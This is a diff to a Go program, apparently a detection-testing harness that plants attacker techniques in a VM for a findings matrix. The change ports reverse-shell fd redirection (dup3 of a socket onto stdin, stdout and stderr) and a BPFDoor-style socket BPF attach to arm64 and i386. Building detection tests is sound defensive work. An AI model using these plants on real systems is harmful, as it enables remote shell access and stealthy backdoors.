@@ -354,9 +354,12 @@ func main() {
 		fmt.Printf("PLANT pid=%d tech=revshell-direct\n", os.Getpid())
 		os.Stdout.Sync()
 		anunciou = true
-		syscall.Dup2(sfd, 0)
-		syscall.Dup2(sfd, 1)
-		syscall.Dup2(sfd, 2)
+		// Dup3 e não Dup2: o arm64 não tem a syscall dup2 — o kernel só
+		// expõe dup3 nas arquiteturas mais novas, e a stdlib do Go segue
+		// isso. Dup3(a, b, 0) é exatamente Dup2(a, b).
+		must(syscall.Dup3(sfd, 0, 0), "dup3 stdin")
+		must(syscall.Dup3(sfd, 1, 0), "dup3 stdout")
+		must(syscall.Dup3(sfd, 2, 0), "dup3 stderr")
 
 	case "revshell-bridge": // correlate.revshell_bridge: shell lê de pipe, ponte
 		// (este processo) segura o outro lado do pipe e o socket de saída.
@@ -650,11 +653,11 @@ func plantarBPFDoor() {
 	// sendo o detentor órfão de fd. A mecânica de atribuição testada é a mesma.
 	sk, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
 	must(err, "socket UDP")
-	const soAttachBPF = 50
-	_, _, e := syscall.Syscall6(syscall.SYS_SETSOCKOPT, uintptr(sk), syscall.SOL_SOCKET,
-		soAttachBPF, uintptr(unsafe.Pointer(&prog)), 4, 0)
-	if e != 0 {
-		must(fmt.Errorf("%v", e), "SO_ATTACH_BPF")
+	// A chamada mora num arquivo por arquitetura: em i386 não existe
+	// SYS_SETSOCKOPT, tudo passa pelo socketcall. Mesma razão de
+	// internal/pcap/sys_386.go.
+	if err := anexarBPFNoSocket(sk, prog); err != nil {
+		must(err, "SO_ATTACH_BPF")
 	}
 	// Os ids ANTES de fechar o fd do programa: é por eles que a matriz confirma
 	// que o achado é DESTE programa, não de outro objeto BPF vivo na VM.
